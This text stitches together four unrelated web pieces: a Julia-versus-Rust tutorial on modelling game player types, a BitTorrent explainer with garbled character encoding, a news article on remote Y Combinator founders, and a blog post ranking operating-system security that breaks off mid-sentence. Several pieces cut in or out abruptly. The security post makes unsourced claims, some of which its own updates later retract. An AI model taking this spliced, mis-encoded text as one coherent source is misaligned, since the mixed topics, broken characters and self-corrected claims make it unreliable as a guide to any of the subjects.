<p>Suppose, you are creating an intergalactic game where players can inhabit three different star systems: Our sun (the <em>solarians</em>), the polar star (the <em>polarians</em>) and Alpha Centauri (the <em>centaurians</em>).
An obvious first step would be to define types for each of these three classes:</p>
<p>In Julia:</p>
<div><pre><code data-lang="julia"><span>struct</span> Solarian <span>end</span>
<span>struct</span> Polarian <span>end</span>
<span>struct</span> Centaurian <span>end</span>
</code></pre></div><p>and in Rust (I will stick to this order if not stated otherwise):</p>
<div><pre><code data-lang="rust"><span>struct</span> <span>Solarian</span>;
<span>struct</span> <span>Polarian</span>;
<span>struct</span> <span>Centaurian</span>;
</code></pre></div><p>(You would add some fields to those structs, of course, but that’s not the point here.)</p>
<p>Now, let’s say you need to store the player value in another object like a game state:</p>
<div><pre><code data-lang="julia"><span>struct</span> GameState
    daytime<span>::</span><span>UInt</span>
    player<span>::???</span>
<span>end</span>
</code></pre></div><div><pre><code data-lang="rust"><span>struct</span> <span>GameState</span> {
    daytime: <span>u64</span>,
    player: <span>???</span>
}
</code></pre></div><p>What type would you use for <code>player</code> in each case?
And what about</p>
<div><pre><code data-lang="julia"><span>function</span> homestar(player<span>::???</span>)<span>::</span>String
    <span>...</span>
<span>end</span>
</code></pre></div><div><pre><code data-lang="rust"><span>fn</span> <span>homestar</span>(player: <span>???</span>) -&gt; <span>String</span> {
    ...
}
</code></pre></div><p>These are the questions we’re here for.</p>
<h2 id="strategy-1-inheritance--subtyping">Strategy 1: Inheritance / subtyping</h2>
<h3 id="julia">Julia</h3>
<p>This is very straightforward in Julia.
Define</p>
<p>and make the structs from above subtypes of that:</p>
<div><pre><code data-lang="julia"><span>struct</span> Solarian <span>&lt;:</span> Player <span>end</span>
<span>struct</span> Polarian <span>&lt;:</span> Player <span>end</span>
<span>struct</span> Centaurian <span>&lt;:</span> Player <span>end</span>
</code></pre></div><p>Dynamic dispatch then allows you to write:</p>
<div><pre><code data-lang="julia">homestar(player<span>::</span>Solarian) <span>=</span> <span>"sun"</span>
homestar(player<span>::</span>Polarian) <span>=</span> <span>"polar star"</span>
homestar(player<span>::</span>Centaurian) <span>=</span> <span>"Alpha Centauri"</span>
homestar(player<span>::</span>Player) <span>=</span> <span>"unknown"</span> <span># or `error("Unknown player class")`</span>
</code></pre></div><h3 id="rust">Rust</h3>
<p>Rust does not have subtyping but you can define relations between types via <em>traits</em> (similar to interfaces in other languages).
So, we can try</p>
<div><pre><code data-lang="rust"><span>trait</span> Player {
    <span>fn</span> <span>homestar</span>(<span>&amp;</span>self) -&gt; <span>String</span>;
}
</code></pre></div><p>and then</p>
<div><pre><code data-lang="rust"><span>impl</span> Player <span>for</span> Solarian {
    <span>fn</span> <span>homestar</span>(<span>&amp;</span>self) -&gt; <span>String</span> {
        <span>String</span>::from(<span>"sun"</span>)
    }
}
</code></pre></div><p>But what about the <code>GameState</code> struct?
We can make use of <em>trait objects</em>, about which we only know that they implement a certain trait.
We especially don’t know the object’s size so we need to reference to it.
If you’re familiar with Rust, you know that this either means using a “normal” reference (<code>&amp;</code> or <code>&amp;mut</code>) and dealing with life time annotations (not my favourite, to be honest) or using a <code>Box</code>ed value.
If you’re not familiar with that, it doesn’t really matter here anyway.
<code>GameState</code> could look like this:</p>
<div><pre><code data-lang="rust"><span>struct</span> <span>GameState</span> {
    daytime: <span>u64</span>,
    player: <span>Box</span><span>&lt;</span>dyn Player<span>&gt;</span>
}
</code></pre></div><p>This works, but does restrict us in what we can do with the <code>Player</code> trait, as it needs to be <a href="https://doc.rust-lang.org/reference/items/traits.html#object-safety"><em>object safe</em></a>.
For example, greeting another player of an arbitrary class</p>
<div><pre><code data-lang="rust"><span>trait</span> Player {
    <span>fn</span> <span>homestar</span>(<span>&amp;</span>self) -&gt; <span>String</span>;
    <span>fn</span> <span>greet</span><span>&lt;</span>T: <span>Player</span><span>&gt;</span>(<span>&amp;</span>self, other: <span>&amp;</span><span>T</span>);
}
</code></pre></div><p>would not work anymore.</p>
<p>This would be easy in Julia, though:</p>
<div><pre><code data-lang="julia">greet(self<span>::</span>Polarian, other<span>::</span>Player) <span>=</span> println(<span>"Hi!"</span>)
greet(self<span>::</span>Polarian, other<span>::</span>Solarian) <span>=</span> println(<span>"Your star doesn't even consist of three separate stars? Pathetic!"</span>)
</code></pre></div><h2 id="strategy-1b-constrained-generics">Strategy 1b: Constrained generics</h2>
<p>Both Julia and Rust offer defining generic types with type parameters.
Additionally, one can put constraints on those parameters.
This allows us to do a smiliar thing as in strategy 1 but without hiding the concrete player type in the <code>GameState</code> struct:</p>
<div><pre><code data-lang="julia"><span>abstract type</span> Player <span>end</span>
<span>struct</span> Solarian <span>&lt;:</span> Player <span>end</span>

<span>struct</span> GameState{P <span>&lt;:</span> Player}
    daytime<span>::</span><span>UInt</span>
    player<span>::</span>P
<span>end</span>
</code></pre></div><p>or</p>
<div><pre><code data-lang="rust"><span>trait</span> Player { ... }
<span>struct</span> <span>Solarian</span>;
<span>impl</span> Player <span>for</span> Solarian { ... }

<span>struct</span> <span>GameState</span><span>&lt;</span>P: <span>Player</span><span>&gt;</span> {
    daytime: <span>u64</span>,
    player: <span>P</span>
}
</code></pre></div><p>This approach can be considered more performant in general, as the compiler can emit code for concrete types (<a href="https://doc.rust-lang.org/book/ch10-01-syntax.html#performance-of-code-using-generics"><em>monomorphisation</em></a>) instead of carrying around a clumsy super type that keeps track of subtypes and <a href="https://en.wikipedia.org/wiki/Virtual_method_table">virtual method tables</a>.<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup></p>
<p>However, there is a major concern with this approach: <strong>abstraction leaking</strong>.
Users of the <code>GameState</code> struct now have to decide what concrete type to choose for the parameter <code>P</code>, very strictly so in Rust, not so much in Julia.
This can be okay, but often enough <code>GameState</code> is the right place to deal with that question and really should hide that detail.</p>
<p>So as a rule of thumb: Consider generics for this problem “deep down” in your code but don’t miss the abstraction level where it needs to be kept inside.</p>
<h2 id="strategy-2-enumerations">Strategy 2: Enumerations</h2>
<p>So far, the approaches were not really satisfying for Rust.
But enumerations come to the rescue!
Enumerations (or enums) are types that consist of a concrete and explicit list of possible values (so called <em>variants</em>).</p>
<h3 id="rust-1">Rust</h3>
<p>In Rust, those values can even have their own data which is perfect for our situation:</p>
<div><pre><code data-lang="rust"><span>enum</span> <span>PlayerClass</span> {
    Sol(Solarian),
    Pol(Polarian),
    Cent(Centaurian)
}

<span>struct</span> <span>GameState</span> {
    daytime: <span>u64</span>,
    player: <span>PlayerClass</span>
}

<span>impl</span> PlayerClass {
    <span>fn</span> <span>homestar</span>(<span>&amp;</span>self) -&gt; <span>String</span> {
        <span>use</span> PlayerClass::<span>*</span>;
        <span>match</span> self {
            Sol(_) <span>=&gt;</span> <span>String</span>::from(<span>"sun"</span>),
            ...
        }
    }

    <span>fn</span> <span>greet</span>(<span>&amp;</span>self, other: <span>&amp;</span><span>PlayerClass</span>) {
        <span>use</span> PlayerClass::<span>*</span>;
        <span>match</span> (self, other) {
            (Cent(_), Pol(_)) <span>=&gt;</span> println<span>!</span>(<span>"Hello, fellow three-star-systemer!"</span>),
            ...
        };
    }
}
</code></pre></div><p>This indeed solves all our previous problems and is hence the go-to pattern for this situation.</p>
<h3 id="julia-1">Julia</h3>
<p>Julia does technically have enums, but not really.</p>
<div><pre><code data-lang="julia">@enum PlayerClass Sol Pol Cent
</code></pre></div><p>exists and it will give you a type <code>PlayerClass</code> with exactly these three possible values but enums are not a first class citizen.<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>
But that’s not even relevant for us, more importantly, enum variants in Julia are <em>not</em> able to carry additional data with them!
So all the information in the fields of the <code>Solarian</code>, <code>Polarian</code>, and <code>Centaurian</code> struct can not be build into the <code>PlayerClass</code> enum.
There is no way to sensibly implement</p>
<div><pre><code data-lang="julia"><span>function</span> takedamage!(player<span>::</span>PlayerClass)
    <span>...</span>
<span>end</span>
</code></pre></div><p>whereas it is trivial in Rust:</p>
<div><pre><code data-lang="rust"><span>impl</span> PlayerClass {
    <span>fn</span> <span>takedamage</span>(<span>&amp;</span><span>mut</span> self) {
        <span>match</span> <span>&amp;</span><span>mut</span> self {
            PlayerClass::Sol(solarian) <span>=&gt;</span> solarian.health <span>-=</span> <span>42</span>,
            ...
        };
    }
}
</code></pre></div><p>assuming the struct <code>Solarian</code> has a field <code>health: u64</code>.</p>
<h2 id="conclusion">Conclusion</h2>
<p>You might have guessed it by now, but the general advice is:
<strong>Use subtyping in Julia and enums in Rust.</strong>
One caveat though: Enums can not be extended from the “outside”.
If you plan to let users of your library add new type variants, you will have to use some kind of trait approach.</p>
<p>If you are somewhat familiar with Rust or Julia then a large part of this article is probably very obvious to you.
“Of course I use subtyping, that’s what everybody <em>loves</em> Julia for!” or “Of course I use enums, they’re one of <em>the</em> key features of Rust!” you might say.</p>
<p>However, I find it quite surprising that these two – seemingly rather different – patterns can be used in the same situation.
If you are (without loss of generality) a Julia developer, being aware of the corresponding pattern in Rust might help you design appropriate types faster, should you ever get into that situation; and vice versa.</p>

<p>30 Aug 2020</p>

<p>The decentralized nature of the Internet and the ability to self-host content has always been appealing to me.</p>

<p>Iâ€™m really interested in taking problems and re-working them so that they can be solved without an obvious single point of failure instead of requiring a single central coordinating actor. This can be accomplished using <a href="https://en.wikipedia.org/wiki/Peer-to-peer">peer-to-peer</a> networking â€” instead of connecting to a single server, one would connect with multiple other peers on their network. Coincidentally, I also enjoy collecting data. Thus, the <strong><a href="https://en.wikipedia.org/wiki/BitTorrent">BitTorrent protocol</a></strong> is particularly interesting to me. For this post, I thought I would walk through a conceptual example to help de-mystify how the protocol works.</p>

<p>Upfront warning: there will be a decent amount of hand-waving around the actual networking component of the protocol, since I believe it would just bog down this post (and, realistically, Iâ€™d make a fool of myself).</p>

<h3 id="setting-the-scene">Setting the Scene</h3>

<p>We just finished running an event. Awesome. Maybe it was a conference, an unconference, or somewhere in the middle. It went well and weâ€™re feeling real proud of ourselves. This was also the first year we had talk transcripts as well as a professional photographer. We want to share this content with our organizers! Thereâ€™s one issue thoughâ€¦ the organizers are located all over the world!</p>

<p>Thereâ€™s plenty of options here â€” you could share a SomeCorpCloudServiceâ„¢ Folderâ€¦ maybe run an FTP serverâ€¦ what about physically mailing USB sticks to everyone? All very plausible options. But youâ€™re hesitating. That sounds like a lot of work for you, whether it be paying money for the storage, making sure a device stays plugged in 24/7, or licking tons of envelopes.</p>

<p>What if there was a way your organizers could help forward along the content to other organizers? Maybe some kind of organizer-to-organizer protocolâ€¦ ðŸ¤”</p>

<h3 id="a-first-attempt">A First Attempt</h3>

<p>Letâ€™s think of what we have here:</p>

<ul>
  <li>A pre-defined list of files we want to share.</li>
  <li>A list of clients (ie. organizers, IP addressesâ€¦ basically the same thing) we want to share these files with. This is called a <strong>swarm</strong>.</li>
</ul>

<p>So we develop a simple application. The application will keep track of which files youâ€™ve already downloaded and which ones youâ€™re missing. Itâ€™ll connect you to the swarm and open up individual connections to each person. This might be the entire swarm, or it could be just a few people.</p>

<p>These connections then support the following operations:</p>

<ol>
  <li>We can announce to the entire swarm which files we have already downloaded. We would do this when we first connect to the swarm, when others connect to the swarm, or when our set of downloaded files changes.</li>
  <li>We can connect to a specific client to send or receive a file.</li>
</ol>

<p>The process of sharing works by having a client <em>A</em> check which files it is missing, waiting for another client (<em>B</em>) to announce it has the file, and then communicating with client <em>B</em> to receive the file. Then client <em>A</em> would announce that it now has this file for anyone else who might need it. This lets content propagate through our swarm without always needing to get the files from the same person! That way we are not stuck content-less just because client <em>B</em> decided to go to bed early.</p>

<p>But there seems to be a problem here. Someone needs to provide the content initially, otherwise everyone will just be constantly announcing that they have no files. This is called the <strong>initial seed</strong>.</p>

<p>How would this work in practice? Suppose we have four clients involved and we need to share <code>IMG_3051.jpg</code>. Initially thereâ€™s only three clients in the swarm and none of them have the image. But in the shadows there lurks a mythical fourth client who has yet to connect and who has the image.</p>

<p><img src="https://dominic.cr/assets/images/file-share/scene1.svg" alt="Image showing a swarm of three clients missing the file, with a disconnected fourth client possessing the file" width="300px"></p>

<p>When the client connects, it tells everyone which files it has.</p>

<p><img src="https://dominic.cr/assets/images/file-share/scene2.svg" alt="The fourth client joins the swarm announcing it has the image file." width="300px"></p>

<p>And now things start moving! One of our clients has a fast internet connection, hears this message, realizes â€œhey I need that!â€� and asks for the file. The send completes!</p>

<p><img src="https://dominic.cr/assets/images/file-share/scene3.svg" alt="A send occurs for the file and now a second client has the file." width="300px"></p>

<p>Now that it has the file, this client decides to re-announce what it has.</p>

<p><img src="https://dominic.cr/assets/images/file-share/scene4.svg" alt="Two clients are now announcing they have the file." width="300px"></p>

<p>Time continues flowing. Our remaining clients have now heard both announcements and can receive the file from either client. The <strong>initial seed</strong> could now leave without leaving clients to dry.</p>

<p><img src="https://dominic.cr/assets/images/file-share/scene5.svg" alt="Everyone now has the files, with sends being issued from each client." width="300px"></p>

<p>With this application, we can now share our content peer-to-peer without needing to remain connected the entire time! Others can take up part of the sharing work.</p>

<h3 id="big-files-slow-connections">Big Files, Slow Connections</h3>

<p>The application is working well! Our organizers are slowly getting all of the generated media. Key word being <em>slowly</em>. Youâ€™ve gotten a few reports now that users will occasionally get stuck waiting ages for some of the larger files (RAW images are quite large after all). Not everyone in our swarm has fast internet connections, so the experience can be sub-optimal if you end up requesting a small file from a fast client and a large file from a slow client.</p>

<p>Your first guess here might be to always prioritize selecting the fastest client in the swarm. That sounds reasonableâ€¦ until they get bombarded with requests. Their home connection slows to a crawl. Eventually, they figure out that Netflix is streaming at awful quality due to the application and decide to close it â€” right as someone had downloaded exactly 99% of the image, leaving them unhappy.</p>

<p>A light bulb goes off in your head: <strong>why not split up our files into smaller pieces</strong>? This kills two birds with one stone! It minimizes the impact of slow connectionsâ€¦ downloading 100Kb from a slow connection is less painful than trying to download 100Mb. It also helps avoid re-downloading! If you are on a slow internet connection and already have 99% of a file downloaded and the connection drops all you need to do is download the missing piece instead of re-downloading the entire file.</p>

<p>So itâ€™s time to tweak our application â€” version 2.0.</p>

<p>Your application now conceptually splits up each file into <strong>pieces</strong>. Each piece has the same size. The protocol now uses the following operations:</p>

<ol>
  <li>We can tell the entire swarm which <strong>pieces</strong> we have already downloaded.</li>
  <li>We can send/receive a <strong>piece</strong> for a given connection.</li>
</ol>

<p>Picking the piece size actually has an important trade off. As piece size decreases, there are more announces and more file send/receive connections. If your piece size is too low (or too high!), the protocol loses efficiency.</p>

<h3 id="growing-the-swarm">Growing the Swarm</h3>

<p>Initially, we embedded a list of possible clients in our application. This isnâ€™t the most practical: IP addresses change, organizing teams grow, people want to download the file from multiple devices, etc.</p>

<p>We could develop a centralized <strong>tracker</strong> of peers. This service is responsible for tracking the IP addresses of swarm members, and for providing that list to clients. Our application would register with the tracker on startup and query for available peers. The tracker could periodically send out updates as the swarm changes to keep clients up to date.</p>

<p>This seems less than ideal given our initial goal of offloading as much work as possible and not needing to host anything. Feeling inspired from the peer-to-peer nature of the protocol up to this point, you might get curious and wonder if thereâ€™s a way to exchange swarm information peer-to-peer as well. In the real world, <a href="https://en.wikipedia.org/wiki/Distributed_hash_table">distributed hash tables</a> are generally used to accomplish this (eg. the BitTorrent protocol uses the <a href="https://en.wikipedia.org/wiki/Kademlia">Kademlia</a> system). These approaches all generally require some clients which are always online to bootstrap the search for swarm members, but it provides a way to de-centralize and distribute this work.</p>

<h3 id="do-you-trust-me">Do You Trust Me?</h3>

<p>Up till this point, weâ€™ve trusted all the members of our swarm to send the same files as the <strong>initial seed</strong>. But what if a malicious organizer decides to modify one of the images to make a meme and spreads it masquerading as the original? Alternatively, what if someoneâ€™s connection is flaky and weâ€™re not quite sure we got the right bytes for the image?</p>

<p>Weâ€™ve discussed a similar problem in the past when <a href="https://dominic.cr/2020/05/26/merkle_trees/">Verifying Data with Merkle Trees</a>. The core of solving that problem involved using a <a href="https://en.wikipedia.org/wiki/Checksum">checksum function</a> on our data and sharing the checksum so that others could verify they had the data we intended.</p>

<p>So we decide to try <strong>embedding a checksum with each file piece</strong> in our application alongside our file piece information. Our application can then verify that any piece received from another client matches the checksum! We can now add untrusted members to the swarm without worrying that they might tamper our file data!</p>

<h3 id="what-about-next-year">What About Next Year?</h3>

<p>Weâ€™ve now established a good conceptual protocol for sharing this type of content. But one part of it is still impractical: so much information is baked directly into the application! Organizers really like the application and would like to use it for other events.</p>

<p>The information we needed to coordinate this dance of file-sharing includes:</p>

<ul>
  <li>The list of file pieces and their checksums.</li>
  <li>Any information we need to find other swarm members. As an example, this could be the URL for our tracker!</li>
</ul>

<p>If we were to put this information in a file and modify our application to accept these files, we could now re-use the protocol arbitrarily! This means our application could download and share multiple sources at once.</p>

<p>It turns out that this is exactly what a <code>.torrent</code> file contains (along with other data). These files are encoded using the <a href="https://en.wikipedia.org/wiki/Bencode">Bencode</a> format in order to allow flexibility and offer some size reduction. Everything youâ€™ve read in this post is actually used in the BitTorrent protocol: the process itself, file pieces, checksumming, and trackers (or trackerless via distributed hash tables). Our application is the equivalent to a BitTorrent client!</p>

<p><strong>Well done - we over-engineered a simple file-sharing problem and built BitTorrent from scratch.</strong> ðŸŽ‰</p>

<h3 id="aside-encouraging-good-behavior">Aside: Encouraging Good Behavior</h3>

<p>We didnâ€™t really cover a) how to select which clients we interact with and b) how to select which file pieces to get first, but these are both …</p></article></div></div>

<p>Minutes before Nitthin Chandran was set to present his startup to a powerful group of foreign investors, the power went out in his apartment in Bangalore. The timing couldn’t have been worse: power outages are par for the course in the city, where Chandran was presenting remotely via Zoom, but there was life-changing money on the line.&nbsp;</p>



<p>Chandran, the founder of <a href="https://www.medpiper.com/">MedPiper Technologies</a>, was pitching his Indian hospital-staffing startup for this year’s Demo Day. The two-day event is the culmination of Silicon Valley’s most well-known startup accelerator program, Y Combinator; <a href="https://techcrunch.com/2019/10/02/these-are-the-top-y-combinator-companies-of-all-time-based-on-valuation/">notable program graduates</a> include Airbnb, Stripe, and DoorDash.&nbsp;</p>



<p>The stakes were high, so Chandran came prepared: his Y Combinator–appointed mentor had advised him to upgrade his internet speed and<strong> </strong>make ready multiple backup options for situations just like this one. Saved by a spare dongle he’d bought on sale at his local market, Chandran delivered his one-minute pitch to an unseen audience of high-powered investors and thousands of viewers, all from his apartment in Bangalore.&nbsp;</p>



<p>In spite of the blackout, Chandran kept his cool: “We practiced maybe 100 times before Demo Day.”</p>



<p>For the first time in its 15-year history, <a href="https://techcrunch.com/2020/04/20/y-combinator-officially-shifts-its-next-accelerator-class-to-fully-remote-format/">Y Combinator went fully remote</a> with its famed startup accelerator program. With the coronavirus pandemic making travel and in-person meetings nearly impossible, everything from workshops to the all-important Demo Day went online. The remote experience may have flattened the in-person interactions that drive some of the tech industry’s biggest deals. But founders from non-Western markets say that attending Y Combinator remotely didn’t hinder their success — in fact, it helped. Internet connectivity issues aside, foreign founders say the first fully remote Y Combinator has put these companies on a more equal footing with their American counterparts.</p>

<p>In pre-pandemic times, founders accepted to Y Combinator were flown to San Francisco, where they spent three months developing their startups <a href="https://www.bizjournals.com/sanjose/news/2019/02/12/y-combinator-demo-days-2019-san-francisco.html">before presenting to funders at Demo Day</a>. For non-American founders with operations outside the United States, this often meant spending a full financial quarter away from their teams and home markets to attend workshops and networking events.&nbsp;</p>



<p>“You talk to other international founders, and they’re like, Oh yeah, I spent most of YC on a plane,” said Iain Usiri, a Tanzanian founder whose startup <a href="https://www.ramani.io/">Ramani</a> presented at last week’s Demo Day. By going remote, “The biggest logistical problem is solved,” he said. “You’re on par with a U.S. founder who is in his home market.”</p>



<p>Under normal circumstances, Usiri might’ve fretted over his outfit choice or physical gestures on Demo Day. “Personally, I do well on a stage,” he said. But this time, he and other founders in his class invested in backup internet, high-quality microphones, and new lighting, to ensure their Zoom presentations go as smoothly as possible. A remote presentation has its own anxieties: Usiri said he was so paranoid about power outages in his home in Tanzania, he had nightmares about it leading up to Demo Day. Nicolás López, co-founder of Justo, <a href="https://www.getjusto.com/">a Chilean food-delivery startup</a>, said he worried about competing with social media notifications and emails that might be popping up on investors’ screens during their demo.&nbsp;</p>



<p>But logging onto Y Combinator from the comfort of their home markets meant founders could maintain their startups while benefiting from Y Combinator’s coveted mentorships. “Between when we applied for Y Combinator in March and today, we grew our team from 10 to 95,” said López. “I don’t think we would have been able to do that if we had been in Palo Alto for the past three months.”</p>



<p>In Bangalore, MedPiper’s Chandran, who is building a database of verified doctors and nurses in India, was able to take in-person meetings during the period. He said he signed up to 40,000 medical professionals during his time with Y Combinator. “We don’t think we would have done even 60 to 70% of the sales which we were able to close [had we been away],” Chandran told <em>Rest of World.</em> “All these sales were done in person, walking into hospitals.”&nbsp;</p>



<p>Paradoxically, the remote nature of this year’s Y Combinator meant more face time between founders and partners. “I was asking for office hours all the time, sometimes three meetings a week with partners,” Arthur Alvarenga, founder of Brazilian startup <a href="https://chatpay.com.br/">ChatPay</a> said. “Everyone was very available, and with Zoom, things moved faster. You could get on a call faster than going to campus to meet with them if we were in person.”</p>

<p>Crucially, the pandemic has forced investors to consider any and all investments remotely; it’s leveled the playing field. Alvarenga, based in Brazil, might’ve missed out on chances for in-person meetings. But on Zoom, he’s just as remote as a founder in Boston. Both current and former non-Western Y Combinator participants said that funders are now more willing to take meetings and close deals over Zoom, where they once might have required an in-person meeting. Foreign founders in this batch of Demo Day presenters said they walked away from the event with more than 100 interested investors — far more than they could muster in their local markets.</p>



<p>Thomas Hellman, professor of entrepreneurship and innovation at Oxford’s Saïd Business School, said that the remote nature of today’s business environment has changed investor behavior, perhaps to the benefit of non-American founders.<strong> </strong>“Investors who said they would never invest unless they met a person have now written checks to entrepreneurs without meeting them,” he said.&nbsp;</p>



<p>But a willingness to close deals over Zoom hasn’t changed some of the inherent challenges in raising money as a foreign startup. U.S.-based companies still constitute the majority of the Y Combinator batch: 39 of the <a href="https://techcrunch.com/2020/08/24/here-are-the-98-companies-from-y-combinators-summer-2020-demo-day-1/">197 startups participated</a> from Asia, Africa, and Latin America. Hellman said that, in lieu of organic meetings and face-to-face interactions, venture capital firms are likely to rely on their own referral networks, which he said are essentially frozen during the pandemic. “The biggest thing to look out for is how networks are going to retrench,” he said. “That could lead to more privileged entrepreneurs having access to capital.”&nbsp;&nbsp;</p>



<p>Despite a more remote-friendly environment, Hellmann said foreign startups <a href="https://techcrunch.com/2014/04/22/foreign-startup-founders-face-unique-struggles-to-break-funding-barrier/">still face higher barriers to raising funds</a>. Local companies may still have an advantage, even if it’s a smaller one. “Just because Zoom is making this more democratized, it doesn’t change the fact that some investors are just not going to understand your market or want to invest outside the United States,” said Alvarenga. “And that’s a root problem.”</p>



<p>But for the half a dozen founders from this summer’s batch of presenters who spoke with <em>Rest of World, </em>internet outages and Zoom presentations were minor inconveniences compared to their otherwise positive Y Combinator experiences.&nbsp;</p>



<p>“The real value of YC is the network,” said Alvarenga. “The more quality people you put in, the better the network becomes.”</p>

        <b><time datetime="2020-08-20 23:14:10+0200">2020-08-20 23:14:10 +0200</time></b>
        <p>This is going to be a rather long post, and I cannot add sources for everything right away. I may add sources at any time 
without a notice (my edit policy still applies for other kinds of edits nevertheless). Note that for some things I might 
never be able to provide sources as these are simply things I heard about in public chatrooms.</p>
<p>As you may know, I am in the <a href="https://matrix.to/#/#os-security:fantasycookie17.onederfultech.com">OS Security room on Matrix</a>, 
in which various operating systems are discussed frequently regarding their security. The thing is, it is not that simple, 
as many that have reached widespread use today are much less secure than you would expect (while others which are also widely 
used are <em>more</em> secure than you might think, if not as secure as expected), and those that are secure basically always have 
some other kinds of drawbacks that are not directly related to security, but may be a dealbreaker nevertheless. I will mainly 
focus on desktop and mobile operating systems here, as servers have a very different quantity and quality of attack surface, 
and security should rather be provided by the often well-written, less complex server software, and isolation is done through 
hypervisors anyway, most of the time, as things like clipboard and file sharing are not that important.</p>
<h2>Some basic terms</h2>
<p>It might occur to you that you are not familiar with some of the terms used here. However, I do not know how I could be 
better at explaining them than Wikipedia is (doing so nevertheless seems redundant), so I decided to just link their 
respective pages for you here. (Note: I would normally not explain many of these if they were used in a shorter blogpost 
without all the others, however, the sheer amount of terminology made me deem it appropriate to explain all of them.)</p>

<li>Verified boot: I will actually explain this one myself, because Wikipedia did not appear to have a good definition. Verified boot allows the boot firmware to prevent bootloaders and kernels that do not have a valid cryptographic signature that corresponds to some specified public key to be loaded. These are then supposed to verify the userland, effectively preventing persistent exploits. Now, there has been some criticism, because many devices only allow particular keys, however, good implementations allow you to unlock them, specify your own keys, and then relock them, meaning user freedom is not impacted by this.</li>

<li><a href="https://en.wikipedia.org/wiki/Virtual_machine">Virtual Machine (VM)</a></li>
</ul>
<h2>Linux (or GNU/Linux)</h2>
<p>I do not even know where to start here. Linux distros offer easy to use, fast and versatile OSes, however, the security is 
very lacking.</p>
<h3>Sandboxing</h3>
<p>Linux systems by default have no sandboxing of applications at all, meaning a compromise of one app easily leads to full 
system compromise. Now, there are two "solutions" to this: The app distribution systems Snap and Flatpak. Flatpak, however, 
<a href="https://flatkill.org/">has some quite severe issues with its sandbox</a>, and while I cannot state similar things about Snap, I 
have been told it was not much better, and it has its own set of issues, such as only allowing a single, proprietary app store.</p>
<h3>General hardening and memory safety</h3>
<p>The Linux kernel does not incorporate modern hardening techniques such as CFI, it is a monolithic kernel (which makes 
applying the principle of least privilege basically impossible), it is written in non-memory safe languages (mainly C), and 
the situation for desktop programs does not look that much better.</p>
<h3>GUI stack</h3>
<p><ins>Update: I meant the most commonly used GUI stack. Of course, there is no "default", since GNOME, as well as Wayland 
compositors and Lomiri, default to Wayland or Mir, respectively.</ins></p>
<p>The default GUI stack is X11, which has been said to be rather insecure, even by the developers themselves, as it allows any 
program to view and manipulate input and output from any other program. While Wayland is said to be more secure, <a href="https://github.com/Aishou/wayland-keylogger">keylogging 
through <code>/proc</code> is still possible</a>.</p>
<p><ins>Update: The mentioned exploit does not use <code>/proc</code>.</ins></p>
<h3>But I always thought Linux was super safe and had almost no bugs?</h3>
<p>The kernel alone contains million lines of code. <a href="https://syzkaller.appspot.com/upstream">Syzbot, a bot used for testing Linux and other kernels finds plenty bugs 
every month, and many of them are not fixed</a>.</p>
<h3>Hardened Linux distros</h3>
<p><ins>Update: As mentioned above, the Wayland keylogger relies on the <code>LD_PRELOAD</code> environment variable, meaning properly 
sandboxed applications may not be able to exploit it. However, the issues with the kernel (which does the majority of the 
sandboxing itself through the namespaces feature), as well as the applications themselves remain.</ins></p>
<p>Actually hardened Linux distros like <a href="https://whonix.org/">Whonix</a> or <a href="https://clip-os.org/en/">CLIP OS</a> do provide better 
security, however they come or will come with restrictions like restricted root or not being able to make files executable 
that were not installed by the package manager, or running any app outside of a restrictive sandbox, due to their use of 
restrictive MAC policies. I also consider it likely that none of them can fix the architectural issues with the kernel and 
GUI stacks, as well as the fact most Linux programs are not designed to be run in a sandbox.</p>
<h2>Android</h2>
<p>Android is a Linux-based OS by Google that greatly improves on the security of the latter. All apps run in sandboxes confined 
from each other, it has strong SELinux policies, and several devices feature a full verified boot implementation, in the case of the 
Google Pixel line, it is especially good, as it is possible to use custom keys, as well as both unlocking and relocking the 
bootloader. Memory safe languages like Java and Kotlin are commonplace. It also partially fixes the issue with Linux being a 
monolithic kernel, as it often uses stub drivers in the kernel that actually rely on userspace drivers. Nevertheless, one 
should not overlook issues such as the way it has become a closed ecosystem, with many devices being non-repairable, the use 
of a a very specific, apparently hard to port API (as the fact the Anbox compatibility layer for Linux does not work that 
great shows), and the reliance of many apps on proprietary Google services (though, to be fair, this is less common in apps 
that are free and open source software). Another issue is that neither the apps nor the GUI are really desktop friendly; they 
remain focused on the use on small touchscreens. For security, GrapheneOS, which is based on Android, should be considered.</p>
<h2>ChromiumOS</h2>
<p>ChromiumOS is another OS by Google, based on Linux. Like Android, it uses SELinux policies, and offers isolation of 
desktop apps from the main operating system. However, there is one glaring issue with this: The central elemenet of the system, 
prominently featured in the name, and perhaps the one program with the largest attack surface; the web browser, is only 
isolated by its own sandbox as well as said SELinux policies, and not by the stronger isolation that their own KVM-based 
emulator crosvm offers, which is written in Rust and can thus be considered memory safe. It is also one of the worst 
operating systems for privacy due to <a href="https://www.chromium.org/chromium-os/chromiumos-design-docs/login">the way how login is handled</a>.</p>
<h2>BSD</h2>
<p>FreeBSD, OpenBSD, NetBSD, HardenedBSD and so on all promise secure operating systems. While they are probably not as bad as 
Linux, especially on servers, their security is still lacking, and they have no proper desktop security model at all, mainly 
because they use X11 for a GUI stack, and browsers that have sandboxes elsewhere are not sandboxed here. They still use 
memory unsafe languages and monolithic kernels. <a href="https://isopenbsdsecu.re/">Here</a> is some more information on OpenBSD 
specifically, which, while having improved security for various programs, and utilizing quite a bit more hardening than Linux, 
is not actually as secure as it claims, due to aforementioned issues.
<ins> Update: NetBSD runs some drivers in user space by using a special "rump kernel", which should make them more portable. 
<a href="https://en.wikipedia.org/wiki/Netbsd#Virtualization">Source</a></ins></p>
<h2>MacOS and iOS</h2>
<p>These are partially open source operating systems by Apple. They both have (locked-down) verified boot implementations, and 
both employ a certain degree of sandboxing for apps. There is not much to say, they are rather good, but the only devices where 
they properly run is Apple ones, which are known for rather bad value and low repairability. The security model, while okay, 
is not too interesting to be honest. Privacy-wise, they are fine if telemetry is disabled, especially considering the fact 
that both the Safari web browser and the sandbox try to minimize tracking that can be conducted by websites and apps, 
respectively.</p>
<h2>Windows</h2>
<p>The main reasons I see this operating system being liked by the security community include the Hyper-V hypervisor, which 
<a href="https://link.springer.com/chapter/10.1007/978-3-642-05089-3_51">apparently is supposed to be formally verified</a>, as well as 
Windows Defender Application Guard (WDAG), which is supposed to run the Microsoft Edge browser and other applications in a 
specialized VM. Microsoft store apps are also sandboxed, however they are… well, mostly stereotypical apps, and less actual, 
